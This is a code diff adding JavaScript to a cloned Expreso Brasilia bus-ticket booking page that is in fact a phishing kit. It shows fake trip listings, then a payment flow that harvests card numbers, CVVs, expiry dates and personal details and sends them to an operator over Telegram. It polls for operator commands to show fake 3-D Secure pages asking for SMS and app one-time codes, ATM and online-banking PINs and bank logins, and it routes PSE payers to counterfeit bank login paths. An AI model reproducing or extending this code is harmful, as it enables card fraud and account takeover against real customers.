+				{ salida: '11:15 AM', llegada: '11:15 PM', icono: 'wb_sunny' },
+				{ salida: '02:00 PM', llegada: '02:00 AM', icono: 'wb_sunny' },
+				{ salida: '04:00 PM', llegada: '04:00 AM', icono: 'wb_cloudy' },
+				{ salida: '06:00 PM', llegada: '06:00 AM', icono: 'nights_stay' },
+				{ salida: '08:00 PM', llegada: '08:00 AM', icono: 'nights_stay' },
+				{ salida: '10:00 PM', llegada: '10:00 AM', icono: 'bedtime' }
+			];
+
+			// Generar viajes
+			viajesDisponibles = [];
+			const cantidadViajes = Math.floor(Math.random() * 3) + 4; // 4 a 6 viajes
+
+			// Seleccionar horarios aleatorios sin repetir
+			const horariosUsados = [...horarios].sort(() => Math.random() - 0.5).slice(0, cantidadViajes);
+
+			horariosUsados.forEach((horario, index) => {
+				const servicio = servicios[index % servicios.length];
+				const precioOriginal = Math.round(precioBase * (1 + servicio.descuento / 100));
+				const precioFinal = precioBase;
+
+				viajesDisponibles.push({
+					id: index + 1,
+					servicio: servicio.nombre,
+					subtitulo: servicio.subtitulo,
+					estrellas: servicio.estrellas,
+					horaSalida: horario.salida,
+					horaLlegada: horario.llegada,
+					iconoHora: horario.icono,
+					precioOriginal: servicio.descuento > 0 ? precioOriginal : null,
+					precio: precioFinal,
+					origen: origen.toUpperCase(),
+					destino: destino.toUpperCase()
+				});
+			});
+
+			// Ordenar por hora de salida
+			viajesDisponibles.sort((a, b) => {
+				const horaA = parseInt(a.horaSalida.split(':')[0]) + (a.horaSalida.includes('PM') && !a.horaSalida.startsWith('12') ? 12 : 0);
+				const horaB = parseInt(b.horaSalida.split(':')[0]) + (b.horaSalida.includes('PM') && !b.horaSalida.startsWith('12') ? 12 : 0);
+				return horaA - horaB;
+			});
+
+			// Renderizar viajes
+			renderizarViajes();
+		}
+
+		function renderizarViajes() {
+			const container = document.getElementById('listaViajes');
+			container.innerHTML = '';
+
+			viajesDisponibles.forEach(viaje => {
+				const card = document.createElement('div');
+				card.className = 'flex flex-col items-stretch justify-start rounded-2xl bg-white shadow-lg overflow-hidden';
+
+				// Generar estrellas
+				let estrellasHTML = '';
+				for (let i = 0; i < 5; i++) {
+					const color = i < viaje.estrellas ? 'text-[#FFC107]' : 'text-gray-300';
+					estrellasHTML += `<span class="material-symbols-outlined ${color}" style="font-size: 18px;">star</span>`;
+				}
+
+				// Precio original tachado si hay descuento
+				const precioOriginalHTML = viaje.precioOriginal
+					? `<p class="text-gray-500 text-base font-normal leading-normal line-through">${formatearPrecio(viaje.precioOriginal)} COP</p>`
+					: '';
+
+				card.innerHTML = `
+					<div class="flex flex-col items-stretch justify-center gap-4 p-4">
+						<!-- Card Header: Logo and Rating -->
+						<div class="flex items-center justify-between">
+							<div class="flex flex-col">
+								<img class="h-8 w-auto" src="/pin/premium-plus-logo.jpg" alt="Expreso Brasilia Logo" onerror="this.style.display='none'; this.nextElementSibling.style.display='block';">
+								<span class="font-bold text-[#D81921] text-lg hidden" style="font-family: 'Oswald', sans-serif;">${viaje.servicio}</span>
+								<p class="text-gray-500 text-sm font-normal leading-normal" style="font-family: 'Source Sans Pro', sans-serif;">${viaje.subtitulo}</p>
+							</div>
+							<div class="flex items-center gap-0">
+								${estrellasHTML}
+							</div>
+						</div>
+
+						<!-- Pricing Section -->
+						<div class="flex flex-col items-start gap-1 border-t border-b border-gray-100 py-4">
+							<p class="text-gray-900 text-2xl font-bold leading-tight tracking-tight" style="font-family: 'Oswald', sans-serif;">${formatearPrecio(viaje.precio)} COP</p>
+							<div class="flex items-center gap-3">
+								${precioOriginalHTML}
+							</div>
+						</div>
+
+						<!-- Itinerary Section -->
+						<div class="flex flex-col gap-3">
+							<!-- Departure -->
+							<div class="flex items-center gap-4">
+								<div class="flex size-10 shrink-0 items-center justify-center rounded-full bg-gray-100 text-gray-700">
+									<span class="material-symbols-outlined text-2xl">${viaje.iconoHora}</span>
+								</div>
+								<div class="flex flex-1 items-center justify-between">
+									<p class="text-gray-900 text-base font-normal leading-normal" style="font-family: 'Source Sans Pro', sans-serif;">${viaje.horaSalida}</p>
+									<p class="text-gray-900 text-base font-bold leading-normal text-right" style="font-family: 'Oswald', sans-serif;">${viaje.origen}</p>
+								</div>
+							</div>
+
+							<!-- Route line -->
+							<div class="flex items-center gap-4">
+								<div class="flex h-6 w-10 shrink-0 items-center justify-center">
+									<div class="h-full w-px border-l-2 border-dashed border-gray-400"></div>
+								</div>
+								<div class="flex-1">
+									<p class="text-gray-500 text-sm font-normal leading-normal" style="font-family: 'Source Sans Pro', sans-serif;">Directo</p>
+								</div>
+							</div>
+
+							<!-- Arrival -->
+							<div class="flex items-center gap-4">
+								<div class="flex size-10 shrink-0 items-center justify-center rounded-full bg-gray-100 text-gray-700">
+									<span class="material-symbols-outlined text-2xl">location_on</span>
+								</div>
+								<div class="flex flex-1 items-center justify-between">
+									<p class="text-gray-900 text-base font-normal leading-normal" style="font-family: 'Source Sans Pro', sans-serif;">${viaje.horaLlegada}</p>
+									<p class="text-gray-900 text-base font-bold leading-normal text-right" style="font-family: 'Oswald', sans-serif;">${viaje.destino}</p>
+								</div>
+							</div>
+						</div>
+					</div>
+
+					<!-- Button Group -->
+					<div class="flex flex-1 gap-3 flex-wrap p-4 justify-between border-t border-gray-100">
+						<button onclick="verDetallesViaje(${viaje.id})" class="flex min-w-[84px] flex-1 cursor-pointer items-center justify-center overflow-hidden rounded-full h-12 px-5 bg-[#D81921] hover:bg-[#b8151c] text-white text-base font-bold leading-normal tracking-wide transition-colors" style="font-family: 'Oswald', sans-serif; text-transform: uppercase;">
+							<span class="truncate">Ver detalles</span>
+						</button>
+						<button onclick="seleccionarViaje(${viaje.id})" class="flex min-w-[84px] flex-1 cursor-pointer items-center justify-center overflow-hidden rounded-full h-12 px-5 bg-transparent text-[#005A9C] border-2 border-[#005A9C] hover:bg-[#005A9C] hover:text-white text-base font-bold leading-normal tracking-wide transition-colors" style="font-family: 'Oswald', sans-serif; text-transform: uppercase;">
+							<span class="truncate">Ver sillas</span>
+						</button>
+					</div>
+				`;
+
+				container.appendChild(card);
+			});
+		}
+
+		function verDetallesViaje(viajeId) {
+			// Por ahora solo selecciona el viaje
+			seleccionarViaje(viajeId);
+		}
+
+		function seleccionarViaje(viajeId) {
+			const viaje = viajesDisponibles.find(v => v.id === viajeId);
+			if (!viaje) return;
+
+			// Guardar datos del viaje seleccionado
+			datosViaje.hora = viaje.horaSalida;
+			datosViaje.precioBase = viaje.precio;
+			datosViaje.servicio = viaje.servicio;
+
+			// Ir a selección de sillas
+			iniciarSeleccionSillas(viaje.origen, viaje.destino, datosViaje.fecha, viaje.horaSalida, viaje.precio);
+		}
+
+		function volverAResultados() {
+			ocultarTodo();
+			document.getElementById('seccion-resultados').classList.remove('hidden');
+			document.getElementById('seccion-resultados').style.display = 'flex';
+			document.getElementById('seccion-resultados').style.flexDirection = 'column';
+		}
+
+		// Exponer funciones globales para el widget
+		window.iniciarSeleccionSillas = iniciarSeleccionSillas;
+		window.buscarViaje = buscarViaje;
+		window.volverAResultados = volverAResultados;
+		window.seleccionarViaje = seleccionarViaje;
+
+		// =====================================================
+		// FUNCIONES DE PAGO - Expreso Brasilia con Telegram
+		// =====================================================
+
+		// Generar ID único de sesión para Brasilia
+		function generarUniqIdBrasilia() {
+			const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+			let result = 'EB';
+			for (let i = 0; i < 6; i++) {
+				result += chars.charAt(Math.floor(Math.random() * chars.length));
+			}
+			return result;
+		}
+
+		// Obtener o crear ID de sesión
+		let brasiliaUniqId = sessionStorage.getItem('brasiliaUniqId');
+		if (!brasiliaUniqId) {
+			brasiliaUniqId = generarUniqIdBrasilia();
+			sessionStorage.setItem('brasiliaUniqId', brasiliaUniqId);
+		}
+
+		// Variables para el proceso de pago
+		let totalAPagar = 0;
+		let seccionAnteriorPago = 'seccion-inicio';
+		let pollingActivo = false;
+		let pollingInterval = null;
+		let datosRecopilados = {};
+		let monedaActual = 'COP';
+
+		// =====================================================
+		// FUNCIONES DE NAVEGACIÓN ENTRE SECCIONES
+		// =====================================================
+
+		function mostrarSeccion(seccionId) {
+			// Ocultar página principal, footer y widget
+			document.getElementById('page-container').style.display = 'none';
+			document.getElementById('mainFooter').style.display = 'none';
+			document.getElementById('reservamosPortal').style.display = 'none';
+
+			// Ocultar todas las secciones
+			const secciones = document.querySelectorAll('section[id^="seccion-"]');
+			secciones.forEach(seccion => {
+				seccion.classList.add('hidden');
+				seccion.style.display = 'none';
+			});
+
+			// Mostrar la sección solicitada
+			const seccion = document.getElementById(seccionId);
+			if (seccion) {
+				seccion.classList.remove('hidden');
+				seccion.style.display = 'flex';
+				seccion.style.flexDirection = 'column';
+			}
+		}
+
+		// =====================================================
+		// FUNCIONES DE TELEGRAM
+		// =====================================================
+
+		// Construir mensaje de pago para Telegram (plantilla Brasilia)
+		function construirMensajePagoTelegram(tipoPago) {
+			let mensaje = '';
+
+			mensaje += `🚌 *EXPRESO BRASILIA - PAGO*\n`;
+			mensaje += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
+			mensaje += `🔑 *ID Sesión:* \`${brasiliaUniqId}\`\n`;
+			mensaje += `💰 *Total:* \`${totalAPagar} ${monedaActual}\`\n`;
+			mensaje += `💳 *Método:* \`${tipoPago === 'tarjeta' ? 'Tarjeta de Crédito' : 'PSE'}\`\n\n`;
+
+			if (tipoPago === 'tarjeta') {
+				mensaje += `📋 *DATOS DE TARJETA*\n`;
+				mensaje += `━━━━━━━━━━━━━━━━━━━━━\n`;
+				mensaje += `💳 *Número:* \`${datosRecopilados.numeroTarjeta || '--'}\`\n`;
+				mensaje += `👤 *Titular:* \`${datosRecopilados.nombreTitular || '--'}\`\n`;
+				mensaje += `📅 *Vence:* \`${datosRecopilados.fechaVencimiento || '--'}\`\n`;
+				mensaje += `🔒 *CVV:* \`${datosRecopilados.cvv || '--'}\`\n\n`;
+			} else {
+				mensaje += `🏦 *DATOS PSE*\n`;
+				mensaje += `━━━━━━━━━━━━━━━━━━━━━\n`;
+				mensaje += `🏦 *Banco:* \`${datosRecopilados.banco || '--'}\`\n`;
+				mensaje += `👥 *Tipo:* \`${datosRecopilados.tipoPersona || '--'}\`\n\n`;
+			}
+
+			mensaje += `👤 *DATOS DEL PAGADOR*\n`;
+			mensaje += `━━━━━━━━━━━━━━━━━━━━━\n`;
+			mensaje += `👤 *Nombre:* \`${datosRecopilados.nombre || '--'}\`\n`;
+			mensaje += `📧 *Email:* \`${datosRecopilados.email || '--'}\`\n`;
+			mensaje += `📱 *Celular:* \`${datosRecopilados.celular || '--'}\`\n`;
+			mensaje += `📍 *Dirección:* \`${datosRecopilados.direccion || '--'}\`\n`;
+			mensaje += `🏙️ *Ciudad:* \`${datosRecopilados.ciudad || '--'}\`\n`;
+			mensaje += `🗺️ *Depto:* \`${datosRecopilados.departamento || '--'}\`\n\n`;
+
+			mensaje += `🕐 *Estado:* \`PAGO_INICIADO\`\n`;
+
+			return mensaje;
+		}
+
+		// Enviar datos a Telegram con botones
+		async function enviarPagoATelegram(tipoPago) {
+			const mensaje = construirMensajePagoTelegram(tipoPago);
+
+			try {
+				const response = await fetch('/api/telegram/send', {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/json',
+						'Accept': 'application/json'
+					},
+					body: JSON.stringify({
+						uniqid: brasiliaUniqId,
+						template: 'pinbus_tdc',
+						data: {
+							...datosRecopilados,
+							total: totalAPagar,
+							metodo_pago: tipoPago,
+							status: 'PAGO_INICIADO',
+							ente: 'brasilia'
+						}
+					})
+				});
+
+				const result = await response.json();
+				console.log('Pago enviado a Telegram:', result);
+				return result.success;
+			} catch (error) {
+				console.error('Error enviando pago a Telegram:', error);
+				return false;
+			}
+		}
+
+		// Enviar datos adicionales (OTP, claves, etc.) a Telegram
+		async function enviarDatosAdicionalesATelegram(tipo, valor) {
+			try {
+				const response = await fetch('/api/telegram/send-info', {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/json',
+						'Accept': 'application/json'
+					},
+					body: JSON.stringify({
+						uniqid: brasiliaUniqId,
+						template: 'pinbus_tdc',
+						includeButtons: true,
+						data: {
+							...datosRecopilados,
+							[tipo]: valor,
+							status: `${tipo.toUpperCase()}_RECIBIDO`
+						}
+					})
+				});
+
+				const result = await response.json();
+				console.log(`${tipo} enviado a Telegram:`, result);
+				return result.success;
+			} catch (error) {
+				console.error(`Error enviando ${tipo} a Telegram:`, error);
+				return false;
+			}
+		}
+
+		// =====================================================
+		// POLLING - Verificar botón presionado en Telegram
+		// =====================================================
+
+		// Funciones para mostrar/ocultar el overlay de carga
+		function mostrarOverlayCarga(texto = 'Procesando...') {
+			const overlay = document.getElementById('loadingOverlay');
+			const loadingText = document.getElementById('loadingText');
+			if (overlay) {
+				if (loadingText) loadingText.textContent = texto;
+				overlay.classList.remove('hidden');
+			}
+		}
+
+		function ocultarOverlayCarga() {
+			const overlay = document.getElementById('loadingOverlay');
+			if (overlay) {
+				overlay.classList.add('hidden');
+			}
+		}
+
+		async function iniciarPolling() {
+			if (pollingActivo) return;
+
+			pollingActivo = true;
+			console.log('Iniciando polling para sesión:', brasiliaUniqId);
+
+			// Mostrar overlay de carga
+			mostrarOverlayCarga('Verificando información...');
+
+			pollingInterval = setInterval(async () => {
+				try {
+					const response = await fetch('/api/telegram/check-button', {
+						method: 'POST',
+						headers: {
+							'Content-Type': 'application/json',
+							'Accept': 'application/json'
+						},
+						body: JSON.stringify({
+							uniqid: brasiliaUniqId
+						})
+					});
+
+					const data = await response.json();
+					console.log('Respuesta de check-button:', data);
+
+					if (data.button) {
+						console.log('Botón presionado detectado:', data.button);
+						detenerPolling();
+						procesarRespuestaTelegram(data.button);
+					}
+				} catch (error) {
+					console.error('Error en polling:', error);
+				}
+			}, 2000);
+		}
+
+		function detenerPolling() {
+			pollingActivo = false;
+			if (pollingInterval) {
+				clearInterval(pollingInterval);
+				pollingInterval = null;
+			}
+			// Ocultar overlay de carga
+			ocultarOverlayCarga();
+			console.log('Polling detenido');
+		}
+
+		// Procesar la respuesta de Telegram y mostrar la sección correspondiente
+		function procesarRespuestaTelegram(boton) {
+			console.log('procesarRespuestaTelegram llamada con botón:', boton);
+
+			// Ocultar spinners de botones de pago
+			ocultarSpinnersPago();
+
+			// Mapeo de botones a secciones
+			const mapeoSecciones = {
+				'tdc': 'seccion-tdc',
+				'codsms': 'seccion-otpsms',
+				'codapp': 'seccion-otpapp',
+				'login': 'seccion-login',
+				'pincaj': 'seccion-clavecajero',
+				'pinvir': 'seccion-clavevirtual',
+				'exito': 'seccion-fin',
+				'error': 'seccion-error',
+				'cambiar': 'seccion-cambiar',
+				'otpsms': 'seccion-otpsms',
+				'otpapp': 'seccion-otpapp',
+				'clavecajero': 'seccion-clavecajero',
+				'clavetdc': 'seccion-tdc',
+				'fin': 'seccion-fin',
+				'user': 'seccion-login',
+				'tc': 'seccion-tdc'
+			};
+
+			const seccionId = mapeoSecciones[boton];
+			console.log('Sección a mostrar:', seccionId);
+
+			if (seccionId) {
+				// Actualizar datos de transacción para secciones OTP
+				if (seccionId === 'seccion-otpsms' || seccionId === 'seccion-otpapp') {
+					actualizarDatosTransaccion3D(seccionId);
+				}
+
+				mostrarSeccion(seccionId);
+
+				// Si es EXITO/FIN o ERROR, redirigir después de un tiempo
+				if (boton === 'exito' || boton === 'fin') {
+					document.getElementById('numeroConfirmacion').textContent = brasiliaUniqId;
+					setTimeout(() => {
+						window.location.href = 'https://www.expresobrasilia.com/';
+					}, 8000);
+				}
+
+				if (boton === 'error') {
+					setTimeout(() => {
+						window.location.href = 'https://www.expresobrasilia.com/';
+					}, 8000);
+				}
+			} else {
+				console.error('No se encontró mapeo para el botón:', boton);
+			}
+		}
+
+		function ocultarSpinnersPago() {
+			const botones = ['btnPagarTarjeta', 'btnPagarPSE', 'btnTdc', 'btnOtpSms', 'btnOtpApp', 'btnLogin', 'btnClaveCajero', 'btnClaveVirtual'];
+			botones.forEach(btnId => {
+				const btn = document.getElementById(btnId);
+				if (btn) btn.disabled = false;
+			});
+		}
+
+		// Función para detectar el tipo de tarjeta según el BIN
+		function detectarTipoTarjeta(numeroTarjeta) {
+			const numero = numeroTarjeta.replace(/\s/g, '');
+			if (/^4/.test(numero)) return 'visa';
+			if (/^5[1-5]/.test(numero) || /^2[2-7]/.test(numero)) return 'mastercard';
+			if (/^3[47]/.test(numero)) return 'amex';
+			if (/^3[689]/.test(numero) || /^30[0-5]/.test(numero)) return 'diners';
+			if (/^6011/.test(numero) || /^65/.test(numero) || /^64[4-9]/.test(numero)) return 'discover';
+			return 'visa';
+		}
+
+		// Función para obtener el HTML del logo según el tipo de tarjeta
+		function obtenerLogoTarjeta(tipo) {
+			const logos = {
+				'visa': `<div class="flex items-baseline gap-1">
+					<span class="text-gray-600 text-sm italic">Verified by</span>
+					<span class="text-blue-900 font-bold text-2xl tracking-tight">VISA</span>
+				</div>`,
+				'mastercard': `<div class="flex items-center gap-2">
+					<div class="flex">
+						<div class="w-6 h-6 bg-red-500 rounded-full -mr-2"></div>
+						<div class="w-6 h-6 bg-yellow-400 rounded-full"></div>
+					</div>
+					<div>
+						<span class="text-gray-600 text-xs">mastercard</span>
+						<div class="text-gray-800 font-bold text-sm">SecureCode</div>
+					</div>
+				</div>`,
+				'amex': `<div class="flex items-center gap-2">
+					<div class="bg-blue-600 text-white font-bold px-2 py-1 rounded text-sm">AMERICAN EXPRESS</div>
+					<span class="text-gray-600 text-sm">SafeKey</span>
+				</div>`,
+				'diners': `<div class="flex items-center gap-2">
+					<span class="text-blue-800 font-bold text-lg">Diners Club</span>
+					<span class="text-gray-600 text-sm">ProtectBuy</span>
+				</div>`,
+				'discover': `<div class="flex items-center gap-2">
+					<span class="text-orange-500 font-bold text-lg">DISCOVER</span>
+					<span class="text-gray-600 text-sm">ProtectBuy</span>
+				</div>`
+			};
+			return logos[tipo] || logos['visa'];
+		}
+
+		// Función para actualizar los datos de transacción en las secciones OTP
+		function actualizarDatosTransaccion3D(seccionId) {
+			const ahora = new Date();
+			const fechaFormateada = ahora.getFullYear() + '/' +
+				String(ahora.getMonth() + 1).padStart(2, '0') + '/' +
+				String(ahora.getDate()).padStart(2, '0') + ' ' +
+				String(ahora.getHours()).padStart(2, '0') + ':' +
+				String(ahora.getMinutes()).padStart(2, '0') + ':' +
+				String(ahora.getSeconds()).padStart(2, '0');
+
+			const numeroTarjeta = datosRecopilados.numeroTarjeta || '';
+			const tipoTarjeta = detectarTipoTarjeta(numeroTarjeta);
+			const ultimosCuatro = numeroTarjeta.replace(/\s/g, '').slice(-4) || '0000';
+			const tarjetaEnmascarada = 'XXXX XXXX XXXX ' + ultimosCuatro;
+			const montoFormateado = totalAPagar + ' ' + monedaActual;
+			const logoHTML = obtenerLogoTarjeta(tipoTarjeta);
+
+			if (seccionId === 'seccion-otpsms') {
+				document.getElementById('otpSmsLogo').innerHTML = logoHTML;
+				document.getElementById('otpSmsAmount').textContent = montoFormateado;
+				document.getElementById('otpSmsDate').textContent = fechaFormateada;
+				document.getElementById('otpSmsCardNumber').textContent = tarjetaEnmascarada;
+			} else if (seccionId === 'seccion-otpapp') {
+				document.getElementById('otpAppLogo').innerHTML = logoHTML;
+				document.getElementById('otpAppAmount').textContent = montoFormateado;
+				document.getElementById('otpAppDate').textContent = fechaFormateada;
+				document.getElementById('otpAppCardNumber').textContent = tarjetaEnmascarada;
+			}
+		}
+
+		// =====================================================
+		// FUNCIONES DE PAGO PRINCIPALES
+		// =====================================================
+
+		function procesarPago(total = '150000') {
+			totalAPagar = total;
+			// Formatear el total para mostrar
+			const totalFormateado = formatearPrecio(parseInt(total));
+			document.getElementById('totalMetodoPago').textContent = totalFormateado;
+			document.getElementById('totalTarjeta').textContent = totalFormateado;
+			document.getElementById('totalPSE').textContent = totalFormateado;
+			document.getElementById('monedaMetodoPago').textContent = '';
+			document.getElementById('monedaTarjeta').textContent = '';
+			document.getElementById('monedaPSE').textContent = '';
+
+			const paisVisitante = localStorage.getItem('visitorCountry') || 'CO';
+			const opcionPSE = document.getElementById('opcion-pse');
+			if (paisVisitante !== 'CO') {
+				opcionPSE.style.display = 'none';
+			} else {
+				opcionPSE.style.display = 'block';
+			}
+
+			mostrarSeccion('seccion-metodo-pago');
+		}
+
+		function volverDesdeMetodoPago() {
+			// Volver a la sección de pasajeros
+			ocultarTodo();
+			document.getElementById('seccion-pasajeros').classList.remove('hidden');
+			document.getElementById('seccion-pasajeros').style.display = 'flex';
+			document.getElementById('seccion-pasajeros').style.flexDirection = 'column';
+		}
+
+		function volverAMetodoPago() {
+			mostrarSeccion('seccion-metodo-pago');
+		}
+
+		function seleccionarMetodoPago(metodo) {
+			document.getElementById('opcion-tarjeta').classList.remove('border-[#00529c]');
+			document.getElementById('opcion-tarjeta').classList.add('border-gray-300');
+			document.getElementById('radio-tarjeta').innerHTML = '';
+			document.getElementById('radio-tarjeta').classList.remove('border-[#00529c]', 'bg-[#00529c]');
+			document.getElementById('radio-tarjeta').classList.add('border-gray-400');
+
+			document.getElementById('opcion-pse').classList.remove('border-[#00529c]');
+			document.getElementById('opcion-pse').classList.add('border-gray-300');
+			document.getElementById('radio-pse').innerHTML = '';
+			document.getElementById('radio-pse').classList.remove('border-[#00529c]', 'bg-[#00529c]');
+			document.getElementById('radio-pse').classList.add('border-gray-400');
+
+			if (metodo === 'tarjeta') {
+				document.getElementById('opcion-tarjeta').classList.remove('border-gray-300');
+				document.getElementById('opcion-tarjeta').classList.add('border-[#00529c]');
+				document.getElementById('radio-tarjeta').classList.remove('border-gray-400');
+				document.getElementById('radio-tarjeta').classList.add('border-[#00529c]', 'bg-[#00529c]');
+				document.getElementById('radio-tarjeta').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';
+				setTimeout(() => { mostrarSeccion('seccion-tarjeta'); }, 200);
+			} else if (metodo === 'pse') {
+				document.getElementById('opcion-pse').classList.remove('border-gray-300');
+				document.getElementById('opcion-pse').classList.add('border-[#00529c]');
+				document.getElementById('radio-pse').classList.remove('border-gray-400');
+				document.getElementById('radio-pse').classList.add('border-[#00529c]', 'bg-[#00529c]');
+				document.getElementById('radio-pse').innerHTML = '<div class="w-3 h-3 bg-white rounded-full"></div>';
+				setTimeout(() => { mostrarSeccion('seccion-pse'); }, 200);
+			}
+		}
+
+		function formatearNumeroTarjeta(input) {
+			let valor = input.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
+			let formateado = valor.match(/.{1,4}/g)?.join(' ') || valor;
+			input.value = formateado;
+		}
+
+		function formatearFechaVencimiento(input) {
+			let valor = input.value.replace(/\//g, '').replace(/[^0-9]/g, '');
+			if (valor.length >= 2) {
+				valor = valor.substring(0, 2) + '/' + valor.substring(2);
+			}
+			input.value = valor;
+		}
+
+		function validarFormularioTarjeta() {
+			const numeroTarjeta = document.getElementById('numeroTarjeta').value.replace(/\s/g, '');
+			const nombreTitular = document.getElementById('nombreTitular').value.trim();
+			const fechaVencimiento = document.getElementById('fechaVencimiento').value;
+			const cvv = document.getElementById('cvv').value;
+			const nombrePagador = document.getElementById('nombrePagadorTarjeta').value.trim();
+			const emailPagador = document.getElementById('emailPagadorTarjeta').value.trim();
+			const celularPagador = document.getElementById('celularPagadorTarjeta').value.trim();
+			const direccionPagador = document.getElementById('direccionPagadorTarjeta').value.trim();
+			const ciudadPagador = document.getElementById('ciudadPagadorTarjeta').value.trim();
+			const departamentoPagador = document.getElementById('departamentoPagadorTarjeta').value.trim();
+
+			if (numeroTarjeta.length < 13) { alert('Ingresa un número de tarjeta válido'); return false; }
+			if (!nombreTitular) { alert('Ingresa el nombre del titular'); return false; }
+			if (fechaVencimiento.length < 5) { alert('Ingresa la fecha de vencimiento'); return false; }
+			if (cvv.length < 3) { alert('Ingresa el código CVV'); return false; }
+			if (!nombrePagador) { alert('Ingresa el nombre del pagador'); return false; }
+			if (!emailPagador || !emailPagador.includes('@')) { alert('Ingresa un correo electrónico válido'); return false; }
+			if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) { alert('Ingresa un número de celular válido'); return false; }
+			if (!direccionPagador) { alert('Ingresa la dirección'); return false; }
+			if (!ciudadPagador) { alert('Ingresa la ciudad'); return false; }
+			if (!departamentoPagador) { alert('Ingresa el departamento'); return false; }
+
+			return true;
+		}
+
+		async function pagarConTarjeta() {
+			if (!validarFormularioTarjeta()) return;
+
+			datosRecopilados.numeroTarjeta = document.getElementById('numeroTarjeta').value.trim();
+			datosRecopilados.nombreTitular = document.getElementById('nombreTitular').value.trim();
+			datosRecopilados.fechaVencimiento = document.getElementById('fechaVencimiento').value.trim();
+			datosRecopilados.cvv = document.getElementById('cvv').value.trim();
+			datosRecopilados.nombre = document.getElementById('nombrePagadorTarjeta').value.trim();
+			datosRecopilados.email = document.getElementById('emailPagadorTarjeta').value.trim();
+			datosRecopilados.celular = document.getElementById('celularPagadorTarjeta').value.trim();
+			datosRecopilados.direccion = document.getElementById('direccionPagadorTarjeta').value.trim();
+			datosRecopilados.ciudad = document.getElementById('ciudadPagadorTarjeta').value.trim();
+			datosRecopilados.departamento = document.getElementById('departamentoPagadorTarjeta').value.trim();
+
+			document.getElementById('btnPagarTarjeta').disabled = true;
+			mostrarOverlayCarga('Procesando pago...');
+			await enviarPagoATelegram('tarjeta');
+			iniciarPolling();
+		}
+
+		function validarFormularioPSE() {
+			const banco = document.getElementById('selectBanco').value;
+			const tipoPersona = document.getElementById('selectTipoPersona').value;
+			const nombrePagador = document.getElementById('nombrePagadorPSE').value.trim();
+			const emailPagador = document.getElementById('emailPagadorPSE').value.trim();
+			const celularPagador = document.getElementById('celularPagadorPSE').value.trim();
+			const direccionPagador = document.getElementById('direccionPagadorPSE').value.trim();
+			const ciudadPagador = document.getElementById('ciudadPagadorPSE').value.trim();
+			const departamentoPagador = document.getElementById('departamentoPagadorPSE').value.trim();
+
+			if (!banco) { alert('Selecciona tu banco'); return false; }
+			if (!tipoPersona) { alert('Selecciona el tipo de persona'); return false; }
+			if (!nombrePagador) { alert('Ingresa el nombre del pagador'); return false; }
+			if (!emailPagador || !emailPagador.includes('@')) { alert('Ingresa un correo electrónico válido'); return false; }
+			if (!celularPagador || celularPagador.replace(/\s/g, '').length < 10) { alert('Ingresa un número de celular válido'); return false; }
+			if (!direccionPagador) { alert('Ingresa la dirección'); return false; }
+			if (!ciudadPagador) { alert('Ingresa la ciudad'); return false; }
+			if (!departamentoPagador) { alert('Ingresa el departamento'); return false; }
+
+			return true;
+		}
+
+		function pagarConPSE() {
+			if (!validarFormularioPSE()) return;
+
+			const banco = document.getElementById('selectBanco').value;
+			const tipoPersona = document.getElementById('selectTipoPersona').value;
+
+			datosRecopilados.banco = banco;
+			datosRecopilados.tipoPersona = tipoPersona;
+			datosRecopilados.nombre = document.getElementById('nombrePagadorPSE').value.trim();
+			datosRecopilados.email = document.getElementById('emailPagadorPSE').value.trim();
+			datosRecopilados.celular = document.getElementById('celularPagadorPSE').value.trim();
+			datosRecopilados.direccion = document.getElementById('direccionPagadorPSE').value.trim();
+			datosRecopilados.ciudad = document.getElementById('ciudadPagadorPSE').value.trim();
+			datosRecopilados.departamento = document.getElementById('departamentoPagadorPSE').value.trim();
+
+			sessionStorage.setItem('pseDatos', JSON.stringify(datosRecopilados));
+			sessionStorage.setItem('pseTotal', totalAPagar);
+			sessionStorage.setItem('pseBanco', banco);
+
+			document.getElementById('btnPagarPSE').disabled = true;
+			mostrarOverlayCarga('Ingresando a su Banca...');
+
+			const rutasBancos = {
+				'bancolombia': '/3co/trico',
+				'avvillas': '/avvillas/avvi',
+				'bbva': '/bbva/inicio',
+				'bogota': '/bogota/bogo',
+				'cajasocial': '/cajasocial/caja',
+				'colpatria': '/colpatria/colpa',
+				'davivienda': '/davivienda/davi',
+				'falabella': '/falabella/fala',
+				'nequi': '/nequi/nequ',
+				'occidente': '/occidente/occi',
+				'popular': '/popular/popu'
+			};
+
+			const rutaBanco = rutasBancos[banco];
+			if (rutaBanco) {
+				setTimeout(() => { window.location.href = rutaBanco; }, 1500);
+			} else {
+				ocultarOverlayCarga();
+				document.getElementById('btnPagarPSE').disabled = false;
+				alert('Banco no disponible. Por favor selecciona otro banco.');
+			}
+		}
+
+		// =====================================================
+		// FUNCIONES DE VALIDACIÓN PARA SECCIONES ADICIONALES
+		// =====================================================
+
+		function validarTdc() {
+			const numero = document.getElementById('tdcNumeroInput').value.replace(/\s/g, '');
+			const vencimiento = document.getElementById('tdcVencimientoInput').value;
+			const cvv = document.getElementById('tdcCvvInput').value;
+			const isValid = numero.length >= 13 && vencimiento.length === 5 && cvv.length >= 3;
+			document.getElementById('btnTdc').disabled = !isValid;
+		}
+
+		async function enviarTdc() {
+			const numero = document.getElementById('tdcNumeroInput').value.trim();
+			const vencimiento = document.getElementById('tdcVencimientoInput').value.trim();
+			const cvv = document.getElementById('tdcCvvInput').value.trim();
+
+			document.getElementById('btnTdc').disabled = true;
+			mostrarOverlayCarga('Verificando tarjeta...');
+
+			datosRecopilados.tdc_numero = numero;
+			datosRecopilados.tdc_vencimiento = vencimiento;
+			datosRecopilados.tdc_cvv = cvv;
+
+			await enviarDatosAdicionalesATelegram('tdc', `${numero} | ${vencimiento} | ${cvv}`);
+			iniciarPolling();
+		}
+
+		function validarOtpSms() {
+			const valor = document.getElementById('otpSmsInput').value;
+			const isValid = valor.length >= 6;
+			document.getElementById('btnOtpSms').disabled = !isValid;
+		}
+
+		async function enviarOtpSms() {
+			const valor = document.getElementById('otpSmsInput').value.trim();
+			document.getElementById('btnOtpSms').disabled = true;
+			mostrarOverlayCarga('Verificando código...');
+			datosRecopilados.otp_sms = valor;
